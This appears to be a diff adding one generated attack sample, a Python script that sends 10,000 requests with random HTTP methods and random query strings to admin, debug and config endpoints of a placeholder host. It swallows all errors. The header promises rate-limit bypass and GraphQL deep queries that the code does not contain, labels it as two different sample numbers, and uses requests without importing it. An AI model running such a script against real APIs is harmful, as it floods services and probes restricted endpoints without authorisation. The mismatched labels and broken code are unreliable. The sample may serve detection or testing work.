@@ -1,0 +1,23 @@
+# Resource Exhaustion - API Abuse Sample 12
+# Created: 2026-03-30T22:24:11.730336
+# Type: API Rate Limit Bypass / Enumeration / GraphQL Deep Query
+
+# API Fuzzing Attack - Sample 6
+import random
+import string
+
+def api_fuzzing():
+    endpoints = ["/admin", "/api", "/v1", "/v2", "/debug", "/config"]
+    methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
+    
+    for _ in range(10000):
+        endpoint = random.choice(endpoints)
+        method = random.choice(methods)
+        params = ''.join(random.choices(string.ascii_letters, k=100))
+        
+        try:
+            requests.request(method, f"https://api.target.com{endpoint}?{params}")
+        except:
+            pass
+            
+api_fuzzing()
